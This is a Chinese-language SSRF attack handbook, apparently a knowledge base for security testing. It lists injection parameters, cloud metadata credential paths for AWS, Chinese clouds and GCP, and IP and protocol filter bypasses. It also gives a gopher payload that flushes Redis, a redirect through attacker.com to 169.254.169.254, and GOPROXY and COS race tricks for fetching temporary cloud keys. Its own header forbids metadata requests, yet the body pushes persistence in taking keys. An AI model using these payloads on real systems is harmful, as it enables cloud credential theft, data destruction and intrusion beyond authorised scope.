> **执行红线（2026-11-15）**：本手册为技术知识库。实际测试以 `E:\Agent\0x00_Governance\AGENTS.md` 为权威——SSRF 仅允许回连验证地址 `src-ssrf.bytedance.net/ssrf`，**禁止**请求内网/云元数据网段（169.254.0.0/16、10.0.0.0/8 等）；涉及元数据/AK/SK 的章节仅作影响评估知识，发现线索直接提交漏洞，不执行。
>
> 短表「云厂商元数据路径差」「公开 GOPROXY」用标题搜。英文补充/附件已砍；云元数据路径差和绕过仍在上半。

## 一、原有知识库

# SSRF 测试手册

## 常见注入点

```
图片/文件URL参数: imageUrl=, fileUrl=, url=, link=, targetUrl=
预览/加载功能: preview=, fetch=, load=, callback=
Webhook: webhook_url=, notify_url=, redirect_url=
PDF/截图生成: 传入 URL 生成截图
模型/网关代理: path 带 proxy，参数仍是 targetUrl / url / callback
```

## 检测 Payload

### 使用 DNSLog 验证（无回显）

```bash
# 申请一个 dnslog 域名: dnslog.cn / ceye.io / interact.sh
DNSLOG="your-unique-id.dnslog.cn"

# 发送请求
curl "https://target.com/api/preview?url=http://$DNSLOG/test"

# 去 dnslog 平台查看是否有 DNS 查询记录
# 有记录 → SSRF 存在
```

### 内网探测（确认 SSRF 后）

```bash
# 探测内网常用 IP 段
for ip in 192.168.1.{1..254}; do
  echo "?url=http://$ip"
done

# 探测内网服务端口
?url=http://192.168.1.1:6379/   # Redis
?url=http://192.168.1.1:27017/  # MongoDB
?url=http://192.168.1.1:8080/   # 内网 Web
?url=http://192.168.1.1:22/     # SSH（通过响应时间判断）
```

### 云服务 Metadata（重点）

```bash
# AWS EC2 Metadata（严重危害，可获取 IAM 凭证）
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 国内云 ECS 元数据
?url=http://100.100.100.200/latest/meta-data/
?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/

# GCP Metadata
?url=http://metadata.google.internal/computeMetadata/v1/

# 云厂商（目录通了还要取钥匙，见下「云厂商元数据路径差」）
?url=http://厂商元数据域名/latest/meta-data/
?url=http://厂商元数据域名/latest/meta-data/cam/security-credentials/
?url=http://厂商元数据域名/latest/meta-data/cam/service-role-security-credentials/<ROLE>
?url=http://169.254.169.254/latest/meta-data/
```

### 云厂商元数据路径差 / 回环拦了元数据没拦 / 云开发匿名代理（短表有指针）

认：云厂商元数据；或云开发 / HTTP 网关 path 带 `proxy`，参数是 `targetUrl` / `url` / `callback`；有匿名登录（`signin/anonymously` 一类）就能拿到 token。

打：

1. **过滤对照。** 先打 `http://127.0.0.1/`，再打 `http://厂商元数据域名/latest/meta-data/` 和 `http://169.254.169.254/latest/meta-data/`。回环 403、`Forbidden Loopback` ≠ 元数据也拦了。只拦回环字符串、不按解析后的 IP 再拦云元数据域名，继续打。
2. **钥匙路径。** 目录通了先读角色名（`cam/security-credentials/` 下列表）。再取临时钥匙：`cam/security-credentials/角色名` 常 404，**必须再打** `cam/service-role-security-credentials/角色名`。按 AWS `iam/security-credentials/` 菜谱在 404 停手 = 漏钥匙。
3. **匿名网关当入口。** 官方演示环境、匿名登录拿到的 token，**不当「已经登录、权限内」**。带着它打 `*proxy*` 的 URL 参。别的环境同一接口可能禁掉，换环境继续试，不把一处禁掉当成全产品安全。
4. **固定 POST 的开放代理。** 直打元数据 405（IMDS 只吃 GET）≠ 没洞。先打公网 302（`redirect-to` 一类）把 Location 指到 `http://100.100.100.200/latest/meta-data/ram/security-credentials/角色`，让代理跟跳转时改成 GET。国内云角色列在 `ram/security-credentials/`。钥拿去 STS GetCallerIdentity。

算成：回显元数据正文，或拿到 `TmpSecretId` / `TmpSecretKey` / `Token`，再用这三样调云 API（`GetCallerIdentity` 一类）对上主账号。ListBuckets 403 别停，再签 CLS `DescribeConfigs` 看采集配置/主题。只读到 instance-id、钥匙 404 或调不通 → 还没成。

假点：代理只允许模型厂商白名单、元数据也 403；匿名开了但代理对匿名关死；钥匙是窄角色且没证明能调任何云 API（半条，别空喊接管全账号）。单站没中不删短表这行。

和通用「SSRF 打 `169.254.169.254`」不是重复：本条补的是 **厂商钥匙路径差 + 回环/元数据过滤分裂 + 匿名网关当入口**。公开 GOPROXY 不是本枪步骤，见下一节。

### 公开 GOPROXY（短表有指针）

认：公开 GOPROXY（`/go/`、模块 `/@v/list`）会按模块路径做 `?go-get=1` 再跟 VCS。**不是**上一节云开发 `*proxy*`。

打（不登录）：

1. 模块路径写成自己的域。  
2. 页上 `go-import` 用 **hg** + `http://厂商元数据域名/...`（git HTTPS 常超时）。  
3. RFC1918 Forbidden ≠ 元数据域名也拦。目录通了钥匙走 `cam/service-role-security-credentials/角色`（同上一节第 2 步）。

算成：hg 报错/回显出元数据或临时钥匙，再 GetCallerIdentity 问出 AccountId。

假点：不是 GOPROXY / 模块路径不会 `go-get`；元数据域名也被拦（不只 Forbidden RFC1918）；hg 也不跟且出不了钥；钥调不通。单站没中不删短表这行。

## 绕过技巧

```bash
# 绕过 IP 黑名单
http://127.0.0.1/    → http://2130706433/       # 十进制 IP
                     → http://0177.0.0.1/        # 八进制
                     → http://0x7f000001/         # 十六进制
                     → http://127.1/             # 简写

# 绕过 localhost 过滤
http://localhost/    → http://[::1]/             # IPv6
                     → http://127.0.0.1.xip.io/ # DNS 解析到 127

# 协议变换
http://internal-host/ → file:///etc/passwd
                      → gopher://127.0.0.1:6379/_*1...（打 Redis）
                      → dict://127.0.0.1:6379/info

# URL 重定向绕过
搭建重定向服务: http://attacker.com/redirect → 302 → http://169.254.169.254/
```

### COS 回源竞态（见了回源再打）

认：业务从 COS/OSS **取对象**，桶上配了「对象不存在则回源」到你能控的源；你还能对**同一 key** PUT 和 DELETE。没回源配置不要空打。

打：

1. 回源指到你的站，源上 302 到元数据或内网。  
2. 对同一 key 一边 PUT（检测时对象在，不回源）、一边 DELETE（真正 GET 时对象没了 → 回源跟 302）。并发见 `race-condition-test.md`。  
3. 看业务下载/导入是否打到你的源或内网。

算成：业务侧跟到内网/元数据（回显、带外或导入结果里有）。只证明回源能配、没打到内网 → 没成。

假点：回源不跟 302；检测和下载走同一时刻缓存；你控不了回源目标。不进短表（要自己能配回源，偏窄）。

## gopher 协议打内网服务

```bash
# 打 Redis（写 webshell 或计划任务）
# gopher://127.0.0.1:6379/_RESP编码的命令
?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A

# 工具生成 gopher payload
# gopherus: python gopherus.py --exploit redis
```

---

### 数据库导入功能 FileURL 参数 SSRF（小火炬实战）

认：云数据库管理平台（如 DMS）有 CSV/SQL 文件导入功能，支持从 URL 拉取文件。

打：

1. 进入数据库导入功能（如 `dms.cloud.tencent.com/dev/sql`）
2. 正常操作触发导入，抓包
3. 修改 `FileURL` 参数为内网地址：`tst.qq.com/flag.html?.csv`（用 `.csv` 后缀绕过文件类型校验）
4. 放行后，后端拉取 URL 内容写入数据库
5. 从数据库导出查看 → 拿到内网页面内容

算成：数据库中出现内网页面内容（HTML/flag）。

假点：FileURL 有 URL 白名单校验；只允许 S3/COS 协议的 URL；导入前不发请求只解析本地文件。

### COS 回源竞态绕过检测 → SSRF（小火炬实战）

认：业务导入数据时会校验 URL 是否触发回源（先访问一次检测）。COS 桶配了回源规则，对象不存在时 302 到回源地址。

打（需要攻击者有自己的 COS 桶且配了回源）：

1. 攻击者 COS 桶配回源到自己的服务器，服务器 302 到目标内网
2. 用攻击者 AKSK 对同一 key 签名 PUT 和 DELETE 两个 URL
3. 同时循环运行 PUT（上传一个文件）和 DELETE（删除该文件），制造竞态
4. 效果：访问该 key 时有概率对象存在（不回源，返回文件内容），有概率不存在（回源，302 到攻击者服务器→再 302 到内网）
5. 导入功能检测步骤碰到对象存在 → 放行；下载步骤碰到对象不存在 → 回源 → 跟随 302 → SSRF
6. 提交多个导入任务提高命中概率，或用脚本批量审批执行

算成：后端跟到内网/元数据地址，响应内容出现在数据库中。

假点：回源不跟 302；检测和下载原子化无竞态窗口；导入不由用户触发。
